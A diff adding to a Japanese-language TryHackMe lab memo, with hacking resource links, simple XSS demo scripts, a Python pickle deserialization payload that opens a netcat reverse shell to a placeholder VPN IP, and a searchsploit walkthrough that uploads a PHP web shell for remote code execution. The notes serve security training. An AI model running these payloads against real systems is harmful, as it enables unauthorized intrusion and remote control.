@@ -1,5 +1,17 @@
 # TryHackMe メモ
 
+## よく使うリンク
+
+- exploit-db
+  - <https://www.exploit-db.com/>
+- Crontabジェネレーター
+  - <https://crontab-generator.org/>
+  - <https://crontab.guru/>
+- [チートシート](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- ハッシュクラック
+  - <https://crackstation.net/>
+- [セキュリティ設定ミスのOWASPトップ10](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html)
+
 ## 隠しページを見つける
 
 ```bash
@@ -348,3 +360,55 @@ sudo nmap -Pn --script=ftp-anon.nse <TARGET IP> -p 21
 - Stored XSS
 - Reflected XSS
 - DOM-Based XSS
+
+```html
+<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
+<script>document.getElementById("thm-title").innerText = "I am a hacker"</script>
+```
+
+### Insecure Deserialization
+
+`picklme.py`
+
+```py
+import base64
+import pickle
+
+command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f"
+
+
+class rce(object):
+    def __reduce__(self):
+        import os
+
+        return (os.system, (command,))
+
+
+print(base64.b64encode(pickle.dumps(rce())))
+```
+
+## 既知の脆弱性
+
+```bash
+searchsploit "online book store"
+
+# 検索結果に[Unauthenticated Remote Code Execution（RCE）]がある。コピーして使用する。
+cp /usr/share/exploitdb/exploits/php/webapps/47887.py .
+
+# ヘルプで使い方を確認する
+python 47887.py -h
+# usage: 47887.py [-h] url
+# positional arguments:
+#   url         The URL of the target.
+# options:
+#   -h, --help  show this help message and exit
+
+# URLを引数に指定するとリモートログインできる
+python 47887.py <url>
+# > Attempting to upload PHP web shell...
+# > Verifying shell upload...
+# > Web shell uploaded to http://<url>/bootstrap/img/UIX0yX0eck.php
+# > Example command usage: http://<url>/bootstrap/img/UIX0yX0eck.php?cmd=whoami
+# > Do you wish to launch a shell here? (y/n): y
+# RCE $
+```
